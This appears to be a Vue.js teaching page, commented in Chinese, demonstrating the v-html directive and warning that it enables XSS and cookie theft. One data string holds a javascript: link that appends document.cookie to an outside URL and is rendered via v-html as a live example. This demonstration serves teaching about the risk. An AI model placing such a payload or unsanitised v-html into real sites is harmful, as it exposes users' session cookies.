<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-html指令</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<!--
v-html
    1.作用：向指定节点中渲染包括html结构的内容（v-html可以识别html结构）
    2.有安全性问题：会导致XSS攻击，获取用户cookie，冒充登录；永远不要用在用户提交内容上面
-->
<div id="root">
    <h3>显示 v-html 的作用</h3>
    <div v-html="str"></div>
    <div v-html="str2"></div>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false
    new Vue({
        el:'#root',
        data:{
            str:'<h4>你好 v-html</h4>',
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>跳转吗？携带cookie</a>'
        }
    })
</script>
</body>
</html>
